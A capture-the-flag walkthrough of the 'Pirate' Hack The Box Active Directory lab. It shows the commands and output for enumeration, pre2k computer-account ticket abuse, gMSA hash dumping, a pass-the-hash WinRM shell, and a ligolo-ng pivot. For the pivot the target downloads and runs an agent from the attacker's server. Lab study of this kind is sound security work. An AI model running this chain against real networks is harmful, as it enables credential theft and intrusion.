Target : 10.129.244.95

Machine Information :

`"As is common in real life pentests, you will start the Pirate box with credentials for the following account pentest / p3nt3st2025!&"`

```bash
> echo "10.129.244.95 pirate.htb" | sudo tee -a /etc/hosts  
Please touch the FIDO authenticator.  
10.129.244.95 pirate.htb  
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.244.95
```

Everything is `tcpwrapped` so we `ntpdate`, use the base credentials with `rid brute` and add the `DC` :

```bash
>  sudo ntpdate 10.129.244.95  
15 Jun 08:03:35 ntpdate[1499930]: step time server 10.129.244.95 offset +25199.888073 sec
>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' --rid-brute  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SMB         10.129.244.95   445    DC01             498: PIRATE\Enterprise Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             500: PIRATE\Administrator (SidTypeUser)  
SMB         10.129.244.95   445    DC01             501: PIRATE\Guest (SidTypeUser)  
SMB         10.129.244.95   445    DC01             502: PIRATE\krbtgt (SidTypeUser)  
SMB         10.129.244.95   445    DC01             512: PIRATE\Domain Admins (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             513: PIRATE\Domain Users (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             514: PIRATE\Domain Guests (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             515: PIRATE\Domain Computers (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             516: PIRATE\Domain Controllers (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             517: PIRATE\Cert Publishers (SidTypeAlias)  
SMB         10.129.244.95   445    DC01             518: PIRATE\Schema Admins (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             519: PIRATE\Enterprise Admins (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             520: PIRATE\Group Policy Creator Owners (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             521: PIRATE\Read-only Domain Controllers (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             522: PIRATE\Cloneable Domain Controllers (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             525: PIRATE\Protected Users (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             526: PIRATE\Key Admins (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             527: PIRATE\Enterprise Key Admins (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             553: PIRATE\RAS and IAS Servers (SidTypeAlias)  
SMB         10.129.244.95   445    DC01             571: PIRATE\Allowed RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.244.95   445    DC01             572: PIRATE\Denied RODC Password Replication Group (SidTypeAlias)  
SMB         10.129.244.95   445    DC01             1000: PIRATE\DC01$ (SidTypeUser)  
SMB         10.129.244.95   445    DC01             1101: PIRATE\DnsAdmins (SidTypeAlias)  
SMB         10.129.244.95   445    DC01             1102: PIRATE\DnsUpdateProxy (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             1103: PIRATE\IT (SidTypeGroup)  
SMB         10.129.244.95   445    DC01             1104: PIRATE\a.white_adm (SidTypeUser)  
SMB         10.129.244.95   445    DC01             3101: PIRATE\a.white (SidTypeUser)  
SMB         10.129.244.95   445    DC01             3102: PIRATE\WEB01$ (SidTypeUser)
```

So the DC is `DC01.pirate.htb`. And we found interesting groups.

```bash
>  echo "10.129.244.95 dc01.pirate.htb pirate.htb" | sudo tee -a /etc/hosts  
10.129.244.95 dc01.pirate.htb pirate.htb
```

We retry the fullport nmap scan and `netexec smb` with the default credentials while nmap is running :

```bash
>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' --shares  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SMB         10.129.244.95   445    DC01             [*] Enumerated shares  
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark  
SMB         10.129.244.95   445    DC01             -----           -----------     ------  
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.244.95   445    DC01             C$                              Default share  
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' --shares  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SMB         10.129.244.95   445    DC01             [*] Enumerated shares  
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark  
SMB         10.129.244.95   445    DC01             -----           -----------     ------  
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.244.95   445    DC01             C$                              Default share  
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share

>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' --users  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SMB         10.129.244.95   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                                  
SMB         10.129.244.95   445    DC01             Administrator                 2025-06-08 14:32:36 1       Built-in account for administering the computer/domain    
SMB         10.129.244.95   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain    
SMB         10.129.244.95   445    DC01             krbtgt                        2025-06-08 14:40:29 0       Key Distribution Center Service Account    
SMB         10.129.244.95   445    DC01             a.white_adm                   2026-01-16 00:36:34 0           
SMB         10.129.244.95   445    DC01             a.white                       2025-06-08 19:33:01 0           
SMB         10.129.244.95   445    DC01             pentest                       2025-06-09 13:40:23 0           
SMB         10.129.244.95   445    DC01             j.sparrow                     2025-06-09 15:08:44 0           
SMB         10.129.244.95   445    DC01             [*] Enumerated 7 local users: PIRATE
```

We get the clean fullport scan :

```bash
>  nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.244.95  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-15 01:05 +0200  
Nmap scan report for pirate.htb (10.129.244.95)  
Host is up (0.090s latency).  
Not shown: 65514 filtered tcp ports (no-response)  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Simple DNS Plus  
80/tcp    open  http          Microsoft IIS httpd 10.0  
| http-methods:    
|_  Potentially risky methods: TRACE  
|_http-title: IIS Windows Server  
|_http-server-header: Microsoft-IIS/10.0  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-15 06:06:15Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-15T06:07:50+00:00; +7h00m00s from scanner time.  
| ssl-cert: Subject: commonName=DC01.pirate.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb  
| Not valid before: 2026-06-15T05:48:31  
|_Not valid after:  2027-06-15T05:48:31  
445/tcp   open  microsoft-ds?  
464/tcp   open  kpasswd5?  
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)  
| ssl-cert: Subject: commonName=DC01.pirate.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb  
| Not valid before: 2026-06-15T05:48:31  
|_Not valid after:  2027-06-15T05:48:31  
|_ssl-date: 2026-06-15T06:07:49+00:00; +6h59m59s from scanner time.  
2179/tcp  open  vmrdp?  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-15T06:07:50+00:00; +7h00m00s from scanner time.  
| ssl-cert: Subject: commonName=DC01.pirate.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb  
| Not valid before: 2026-06-15T05:48:31  
|_Not valid after:  2027-06-15T05:48:31  
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb, Site: Default-First-Site-Name)  
|_ssl-date: 2026-06-15T06:07:49+00:00; +6h59m59s from scanner time.  
| ssl-cert: Subject: commonName=DC01.pirate.htb  
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb  
| Not valid before: 2026-06-15T05:48:31  
|_Not valid after:  2027-06-15T05:48:31  
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
9389/tcp  open  mc-nmf        .NET Message Framing  
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49692/tcp open  msrpc         Microsoft Windows RPC  
49694/tcp open  msrpc         Microsoft Windows RPC  
49695/tcp open  msrpc         Microsoft Windows RPC  
49919/tcp open  msrpc         Microsoft Windows RPC  
49940/tcp open  msrpc         Microsoft Windows RPC  
49968/tcp open  msrpc         Microsoft Windows RPC  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Device type: general purpose  
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)  
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10  
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1903 - 22H2 (91%)  
No exact OS matches for host (test conditions non-ideal).  
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-security-mode:    
|   3.1.1:    
|_    Message signing enabled and required  
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s  
| smb2-time:    
|   date: 2026-06-15T06:07:10  
|_  start_date: N/A  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 146.29 seconds
```

`Kerberos 88/tcp ; LDAP 389/tcp & 3268/tcp, msrpc 135/tcp, netBIOS 139/tcp, smb 445/tcp, 3269 ssl/ldap`, so a classic `Active Directory` environment, with `DNS 53/tcp, http 80/tcp, httpapi 5985/tcp` and `RPC over HTTP 49691/tcp`.

We verify the `DC` with `curl` :

```bash
>  curl -sk -D- http://dc01.pirate.htb/ -o /dev/null  
  
HTTP/1.1 200 OK  
Content-Type: text/html  
Last-Modified: Sun, 08 Jun 2025 20:38:47 GMT  
Accept-Ranges: bytes  
ETag: "3d769255b5d8db1:0"  
Server: Microsoft-IIS/10.0  
Date: Mon, 15 Jun 2026 18:45:12 GMT  
Content-Length: 703
```

Then we use `netexec spider_plus` to see everything from the `shares` and enumerate the `computers` from `smb` :

```bash
>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' -M spider_plus -o SHARE=SYSVOL READ_ONLY=true  
  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  DOWNLOAD_FLAG: False  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]     STATS_FLAG: True  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  OUTPUT_FOLDER: /home/vagabond/.nxc/modules/nxc_spider_plus  
SMB         10.129.244.95   445    DC01             [*] Enumerated shares  
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark  
SMB         10.129.244.95   445    DC01             -----           -----------     ------  
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.244.95   445    DC01             C$                              Default share  
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share    
SPIDER_PLUS 10.129.244.95   445    DC01             [+] Saved share-file metadata to "/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.244.95.json".  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Filtered Shares:  1  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Total folders found:  20  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Total files found:    6  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size average:    1.3 KB  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size min:        22 B  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size max:        3.68 KB  
>  nxc ldap 10.129.244.95 -u pentest -p 'p3nt3st2025!&' --computers  
  
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
LDAP        10.129.244.95   389    DC01             [*] Total records returned: 6  
LDAP        10.129.244.95   389    DC01             DC01$  
LDAP        10.129.244.95   389    DC01             WEB01$  
LDAP        10.129.244.95   389    DC01             MS01$  
LDAP        10.129.244.95   389    DC01             EXCH01$  
LDAP        10.129.244.95   389    DC01             gMSA_ADCS_prod$  
LDAP        10.129.244.95   389    DC01             gMSA_ADFS_prod$
```

We got a few computers, the `Domain Controller DC01, a WEB server WEB01$ and MS01$ as well as two group Managed Service Accounts gMSA`.

We download the `SYSVOL` files with `spider_plus` and `grep` it :

```bash
>  nxc smb 10.129.244.95 -u pentest -p 'p3nt3st2025!&' -M spider_plus -o SHARE=SYSVOL READ_ONLY=true DOWNLOAD_FLAG=true  
  
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)  
SMB         10.129.244.95   445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Started module spidering_plus with the following options:  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  DOWNLOAD_FLAG: True  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]     STATS_FLAG: True  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  MAX_FILE_SIZE: 50 KB  
SPIDER_PLUS 10.129.244.95   445    DC01             [*]  OUTPUT_FOLDER: /home/vagabond/.nxc/modules/nxc_spider_plus  
SMB         10.129.244.95   445    DC01             [*] Enumerated shares  
SMB         10.129.244.95   445    DC01             Share           Permissions     Remark  
SMB         10.129.244.95   445    DC01             -----           -----------     ------  
SMB         10.129.244.95   445    DC01             ADMIN$                          Remote Admin  
SMB         10.129.244.95   445    DC01             C$                              Default share  
SMB         10.129.244.95   445    DC01             IPC$            READ            Remote IPC  
SMB         10.129.244.95   445    DC01             NETLOGON        READ            Logon server share    
SMB         10.129.244.95   445    DC01             SYSVOL          READ            Logon server share    
SPIDER_PLUS 10.129.244.95   445    DC01             [+] Saved share-file metadata to "/home/vagabond/.nxc/modules/nxc_spider_plus/10.129.244.95.json".  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] SMB Filtered Shares:  1  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Total folders found:  20  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Total files found:    6  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size average:    1.3 KB  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size min:        22 B  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File size max:        3.68 KB  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] File unique exts:     4 (csv, pol, ini, inf)  
SPIDER_PLUS 10.129.244.95   445    DC01             [*] Downloads successful: 6  
SPIDER_PLUS 10.129.244.95   445    DC01             [+] All files processed successfully.  
>  grep -Ri pass /home/vagabond/.nxc/modules/nxc_spider_plus/10.129.244.95*
```

We find nothing, but the `computers` are intrigueing. We might try `LDAP` with `pre2k` to find a way in if one of these is old enough.

```bash
>  nxc ldap 10.129.244.95 -u pentest -p 'p3nt3st2025!&' -M pre2k  
  
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)    
LDAP        10.129.244.95   389    DC01             [+] pirate.htb\pentest:p3nt3st2025!&    
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: MS01$  
PRE2K       10.129.244.95   389    DC01             Pre-created computer account: EXCH01$  
PRE2K       10.129.244.95   389    DC01             [+] Found 2 pre-created computer accounts. Saved to /home/vagabond/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt  
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb  
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb  
PRE2K       10.129.244.95   389    DC01             [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/vagabond/.nxc/modules/pre2k/ccache
```

And we got 2 `Ticket Granting Tickets` for the computers `EXCH01$` and `MS01$`.

```bash
>  PYTHONNOUSERSITE=1 getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)  
>  sudo ntpdate 10.129.244.95  
15 Jun 21:15:07 ntpdate[1733452]: step time server 10.129.244.95 offset +25200.036171 sec  
>  PYTHONNOUSERSITE=1 getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95  
  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in MS01$.ccache  
>  export KRB5CCNAME=$(pwd)/MS01\$.ccache
```

We use it to get hashes for the `gMSAs` : 

```bash
>  sudo ntpdate 10.129.244.95 && PYTHONNOUSERSITE=1 getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95 && export KRB5CCNAME="${PWD}/MS01$.ccache" && klist -c "$KRB5CCNAME" && PYTHONNOUSERSITE=1 nxc ldap 10.  
129.244.95 -k --use-kcache --gmsa  
  
Please touch the FIDO authenticator.  
15 Jun 21:28:21 ntpdate[1740870]: adjust time server 10.129.244.95 offset -0.002904 sec  
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies    
  
[*] Saving ticket in MS01$.ccache  
Ticket cache: FILE:/home/vagabond/MS01$.ccache  
Default principal: MS01$@PIRATE.HTB  
  
Valid starting       Expires              Service principal  
06/15/2026 21:28:22  06/16/2026 07:28:22  krbtgt/PIRATE.HTB@PIRATE.HTB  
       renew until 06/16/2026 21:28:22  
LDAP        10.129.244.95   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never)    
LDAP        10.129.244.95   389    DC01             [+] PIRATE.HTB\MS01$ from ccache    
LDAP        10.129.244.95   389    DC01             [*] Getting GMSA Passwords  
LDAP        10.129.244.95   389    DC01             Account: gMSA_ADCS_prod$      NTLM: 55d78485f8d9b2d2b37628227ebf936a     PrincipalsAllowedToReadPassword: Domain Secure Servers  
LDAP        10.129.244.95   389    DC01             Account: gMSA_ADFS_prod$      NTLM: abad63faa669b6a4eddfd46432f7ca6c     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

We connect with pass-the-hash to a shell on `ADFS` :

```PowerShell
>  evil-winrm -i 10.129.244.95 -u 'gMSA_ADFS_prod$' -H abad63faa669b6a4eddfd46432f7ca6c  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
                                          
Evil-WinRM shell v3.9  
                                          
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
                                          
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
                                          
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> whoami /priv  
  
PRIVILEGES INFORMATION  
----------------------  
  
Privilege Name                Description                    State  
============================= ============================== =======  
SeMachineAccountPrivilege     Add workstations to domain     Enabled  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled  
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled  
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> ipconfig /all  
  
Windows IP Configuration  
  
  Host Name . . . . . . . . . . . . : DC01  
  Primary Dns Suffix  . . . . . . . : pirate.htb  
  Node Type . . . . . . . . . . . . : Hybrid  
  IP Routing Enabled. . . . . . . . : No  
  WINS Proxy Enabled. . . . . . . . : No  
  DNS Suffix Search List. . . . . . : pirate.htb  
                                      .htb  
  
Ethernet adapter vEthernet (Switch01):  
  
  Connection-specific DNS Suffix  . :  
  Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter  
  Physical Address. . . . . . . . . : 00-15-5D-0B-D0-00  
  DHCP Enabled. . . . . . . . . . . : No  
  Autoconfiguration Enabled . . . . : Yes  
  Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8(Preferred)  
  IPv4 Address. . . . . . . . . . . : 192.168.100.1(Preferred)  
  Subnet Mask . . . . . . . . . . . : 255.255.255.0  
  Default Gateway . . . . . . . . . :  
  DHCPv6 IAID . . . . . . . . . . . : 201332061  
  DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2F-D7-D5-C5-00-0C-29-DE-64-22  
  DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1  
                                      fec0:0:0:ffff::2%1  
                                      fec0:0:0:ffff::3%1  
  NetBIOS over Tcpip. . . . . . . . : Enabled  
  
Ethernet adapter Ethernet0 2:  
  
  Connection-specific DNS Suffix  . : .htb  
  Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter  
  Physical Address. . . . . . . . . : A2-DE-AD-6B-AE-15  
  DHCP Enabled. . . . . . . . . . . : Yes  
  Autoconfiguration Enabled . . . . : Yes  
  IPv4 Address. . . . . . . . . . . : 10.129.244.95(Preferred)  
  Subnet Mask . . . . . . . . . . . : 255.255.0.0  
  Lease Obtained. . . . . . . . . . : Sunday, June 14, 2026 10:57:31 PM  
  Lease Expires . . . . . . . . . . : Monday, June 15, 2026 1:27:30 PM  
  Default Gateway . . . . . . . . . : 10.129.0.1  
  DHCP Server . . . . . . . . . . . : 10.10.10.2  
  DNS Servers . . . . . . . . . . . : 127.0.0.1  
  NetBIOS over Tcpip. . . . . . . . : Enabled  
```

We then use `ligolo-ng` to establish a connection with a `web server` :

```bash
>  cp /usr/bin/ligolo-ng-agent ~/ligolo-agent.exe && python3 -m http.server 9000 --bind $(ip -4 route get 10.129.244.95 | awk '{print $7; exit}')  
  
Serving HTTP on 10.10.14.228 port 9000 (http://10.10.14.228:9000/) ...  
10.129.244.95 - - [15/Jun/2026 21:44:57] "GET /ligolo-agent.exe HTTP/1.1" 200 -
```

```PowerShell
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> curl.exe -o C:\Windows\Temp\ligolo-agent.exe http://10.10.14.228:9000/ligolo-agent.exe  
C:\Windows\Temp\ligolo-agent.exe -connect 10.10.14.228:11601 -ignore-cert
```

```bash
>  ligolo-ng-proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8889  
  
INFO[0000] Loading configuration file ligolo-ng.yaml       
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!    
INFO[0000] Listening on 0.0.0.0:11601                      
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8889    
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.    
   __    _             __                          
  / /   (_)___ _____  / /___        ____  ____ _  
 / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/  
/ /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /    
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /     
       /____/                          /____/      
  
 Made in France ♥            by @Nicocha30!  
 Version: dev  
  
name="PIRATE\\gMSA_ADFS_prod$@DC01" remote="10.129.244.95:64825"
ligolo-ng » INFO[0203] Agent joined.                                 id=00155d0bd000 name="PIRATE\\gMSA_ADFS_prod$@DC01" remote="10.129.244.95:64825"  
ligolo-ng » session  
? Specify a session : 1 - PIRATE\gMSA_ADFS_prod$@DC01 - 10.129.244.95:64825 - 00155d0bd000  
[Agent : PIRATE\gMSA_ADFS_prod$@DC01] » ifconfig  
┌───────────────────────────────────────────────┐  
│ Interface 0                                   │  
├──────────────┬────────────────────────────────┤  
│ Name         │ vEthernet (Switch01)           │  
│ Hardware MAC │ 00:15:5d:0b:d0:00              │  
│ MTU          │ 1500                           │  
│ Flags        │ up|broadcast|multicast|running │  
│ IPv6 Address │ fe80::d976:c606:587e:f1e1/64   │  
│ IPv4 Address │ 192.168.100.1/24               │  
└──────────────┴────────────────────────────────┘  
┌───────────────────────────────────────────────┐  
│ Interface 1                                   │  
├──────────────┬────────────────────────────────┤  
│ Name         │ Ethernet0 2                    │  
│ Hardware MAC │ a2:de:ad:6b:ae:15              │  
│ MTU          │ 1500                           │  
│ Flags        │ up|broadcast|multicast|running │  
│ IPv4 Address │ 10.129.244.95/16               │  
└──────────────┴────────────────────────────────┘  
┌──────────────────────────────────────────────┐  
│ Interface 2                                  │  
├──────────────┬───────────────────────────────┤  
│ Name         │ Loopback Pseudo-Interface 1   │  
│ Hardware MAC │                               │  
│ MTU          │ -1                            │  
│ Flags        │ up|loopback|multicast|running │  
│ IPv6 Address │ ::1/128                       │  
│ IPv4 Address │ 127.0.0.1/8                   │  
└──────────────┴───────────────────────────────┘  
[Agent : PIRATE\gMSA_ADFS_prod$@DC01] » autoroute  
? Select routes to add: 192.168.100.1/24  
? Create a new interface or use an existing one? Use an existing one  
? Select the interface to use ligolo 192.168.100.0/24, fe80::/64, 192.168.100.1/24, 10.129.244.95/16  
WARN[0107] Interface ligolo exists but is not in use. Removing it to avoid conflicts...    
INFO[0107] Interface ligolo configured (will be created on tunnel start)    
INFO[0107] Creating routes for ligolo...                   
? Start the tunnel? Yes  
INFO[0109] Starting tunnel to PIRATE\gMSA_ADFS_prod$@DC01 (00155d0bd000)    
[Agent : PIRATE\gMSA_ADFS_prod$@DC01] »
```

We then add to our hosts and `nmap` :

```bash
>  ip route | grep ligolo  
nmap -Pn -sV -p 445,80,5985 192.168.100.2  
echo "192.168.100.2 web01.pirate.htb adfs.pirate.htb" | sudo tee -a /etc/hosts  
192.168.100.0/24 dev ligolo    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-15 21:53 +0200  
Nmap scan report for 192.168.100.2  
Host is up (0.15s latency).  
  
PORT     STATE SERVICE       VERSION  
80/tcp   open  http          Microsoft IIS httpd 10.0  
445/tcp  open  microsoft-ds?  
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 15.94 seconds  
192.168.100.2 web01.pirate.htb adfs.pirate.htb
```

